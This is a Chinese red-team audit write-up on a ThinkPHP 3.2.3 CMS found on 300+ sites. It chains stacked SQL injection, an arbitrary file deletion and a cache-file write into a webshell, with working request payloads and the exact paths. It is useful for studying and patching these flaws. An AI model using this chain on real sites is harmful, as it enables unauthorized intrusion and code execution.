前言
==

地市级hvv，某下级单位研究院官网使用了这套cms，提取关键字在fofa查询，发现使用该程序的站点有300+，导出目标，使用目录扫描跑一下备份文件，结果不出所料，这么多站点总是有软柿子的拿到源码开始审计。

审计过程
====

源码是thinkphp3.2.3的，比较熟悉，最终通过sql注入插入数据+缓存漏洞成功getsell

Sql注入
-----

这个版本的thinkphp是有很多注入的，find(),select(),delete()都有可能造成注入，先来搜搜find参数，发现一段代码如下：

```php
function getPosition($catid){
    $cate = M('category')->find($catid);
    $pos_id = array(['id'=>$catid,'name'=>$cate['name']]);
```

很明显，存在find的sql注入，全局搜索getPosition函数看看在哪里被调用

```php
 public function position() {
        $pos = getPosition(I('get.catid'));
        $this->pos = $pos;
        $this->display('Public:position');
    }
```

position函数调用了getPosition方法，并且传入的catid也是直接通过I获取的，这里显而易见存在find注入，可直接获取数据。

```php
/index.php?s=/Cn/public/position&catid[where]=11111
```

但是获取的后台密码无法解密，后续也是通过审计找到好几个注入，但都无法进到后台。  
这个版本还有反序列化，但反序列化后的效果也是实现sql注入，都比较鸡肋。

缓存漏洞
----

thinkhp3.2.3是存在S缓存漏洞的

```php
    public function test02(){
        S('name',"\nphpinfo();//");
    }
```

当S的第二个参数可控时，便可以向缓存文件写入内容来getshell，全局搜索S，发现很多地方调用了S，但是挨个看下来之后，第二个参数都无法直接控制。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1558dec669dbb9476161f7ad2550bcdecf8598e1.png)

在这里磕了一点时间，突然想到ThinkPHP 3.2.3默认使用的是PDO驱动来实现的数据库类，而PDO默认是支持多语句查询的，所以前面的注入是可以进行堆叠注入的。  
也就是说我们可以利用堆叠注入向数据库中插入语句，然后去找S的第二个参数是从数据库中取值的地方就可以利用了，有了思路很快就定位到一个地方：

```php
function setConfig($name = 'ALL_CONFIG', $siteid = array()) {
    $config = M('Config');
    $where['status'] = 1;
    if (!empty($siteid)) {
        $where['siteid'] = array('in', $siteid);
    }
    $data = $config->field('id,name,title,value')->where($where)->order('sort ASC')->select();
//设置缓存数组
    $cache_data = array();
    if (!empty($data)) {
        foreach ($data as $key => $value) {
            $cache_data[$value['name']] = $value['value'];
        }
    }

//先删除缓存
    $previous_cache = S($name);
    if (!empty($previous_cache)) {
        S($name, null);
    }
//设置缓存
    S($name, $cache_data);
}
```

setConfig函数通过`S($name, $cache_data)`写入缓存，而`$cache_data`又是从`M('Config')`中查询数据获取的，我们只需要控制sql注入，向config中插入一条数据即可利用缓存漏洞getshell。  
接着往上追，看一下哪里调用的setConfig。  
在/Apps/Cn/Controller/CommonController.class.php中看到

```php
    public function _initialize() {
        //验证是否安装
        if (!file_exists('./data/system_install.lock')) {
            $this->redirect("Install/Index/index");
        }

       ...

        //获取配置

        $system_config = S('ALL_CONFIG' . C('SITEID'));
        //空的情况下生成缓存
        if (empty($system_config)) {
            //生成缓存
            setConfig('ALL_CONFIG' . C('SITEID'), array(0, C('SITEID')));
            $system_config = S('ALL_CONFIG' . C('SITEID'));
        }
```

当`$system_config`为空时，调用`setConfig`。

在S函数中

```php
function S($name,$value='',$options=null) {

    static $cache   =   '';
    if(is_array($options)){
        // 缓存操作的同时初始化
        $type       =   isset($options['type'])?$options['type']:'';
        $cache      =   Think\Cache::getInstance($type,$options);
    }elseif(is_array($name)) { // 缓存初始化
        $type       =   isset($name['type'])?$name['type']:'';
        $cache      =   Think\Cache::getInstance($type,$name);
        return $cache;
    }elseif(empty($cache)) { // 自动初始化
        $cache      =   Think\Cache::getInstance();
    }

    if(''=== $value){ // 获取缓存
        return $cache->get($name);
    }elseif(is_null($value)) { // 删除缓存
        return $cache->rm($name);
    }else { // 缓存数据
        if(is_array($options)) {
            $expire     =   isset($options['expire'])?$options['expire']:NULL;
        }else{
            $expire     =   is_numeric($options)?$options:NULL;
        }
        return $cache->set($name, $value, $expire);
    }
    exit;
}
```

会先进入`$cache->get($name)`判断之前是否有缓存，如果没有的话，则调用setConfig，生成的缓存文件名为`ALL_CONFIG1`的md5，路径为`Apps\Runtime\Temp\94b4e91cbccc674ec30f286e193c1703.php`  
如果缓存已经存在的话，则直接读取缓存，所以如果想进入setConfig的话，还需要想办法把已有的缓存文件给删掉。

任意文件删除
------

我们只需要在找到一个任意文件删除，把已有的缓存文件删除掉，就可以满足getshell的所有条件。  
然后全局搜索unlink找到如下位置：  
/xxlogin/Controller/UeditorController.class.php

```php
    public function delFile(){
        if(IS_POST){
            $filename=I("filename");
            if(!$filename){
                $this->ajaxReturn(array("status"=>0,"msg"=>"文件不存在"));
            }
            $type=I("post.type");
            $data_path=$this->data_path;
            if($type==1){
                $data_path=$this->data_path.I("post.dirname")."/";
            }
            $dir=$data_path.$filename;
            if(is_file($dir)){
                $ok=unlink($dir);
                if($ok){
                    $this->ajaxReturn(array("status"=>1,"msg"=>"删除成功"));
                }else{
                    $this->ajaxReturn(array("status"=>0,"msg"=>"删除失败"));
                }
            }else{
                $this->ajaxReturn(array("status"=>0,"msg"=>"文件不存在"));
            }
        }
    }
```

直接传入`filename`，通过

```php
$dir=$data_path.$filename;
```

拼接进`$dir`，然后执行

```php
$ok=unlink($dir);
```

至此getshell的各要素已经齐备，可以进行利用了

漏洞利用
====

- 利用sql注入向config表中写入写入数据,需要进行换行操作并且闭合后面的代码：

```php
u = "/index.php?s=/Cn/public/position&catid[where]=11111;insert+into+yongsy_config(name,value)+values('1','511111222222111111333333\r\necho+md5(11);/*')%23"
    vul_url = url + u
header = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

resp = requests.get(vul_url, verify=False, timeout=5)
```

- 利用任意文件删除漏洞删除缓存

```php
clearurl=url+"/index.php?s=xxlogin/ueditor/delFile"
data="filename=../../Apps/Runtime/Temp/94b4e91cbccc674ec30f286e193c1703.php"
clearr=requests.post(clearurl,headers=header,data=data,verify=False, timeout=5)
```

- 访问任意页面生成缓存（`_initialize`是全局函数）
- 访问生成的缓存即可getshell

```php
shell_url = url + "/Apps/Runtime/Temp/94b4e91cbccc674ec30f286e193c1703.php"
```

总结
==

之前碰到thinkphp3.2.3版本的都是找S函数的直接可控点，并没有想过利用注入来插入数据，主要还是比较菜，可能对于大佬们来说就是基操。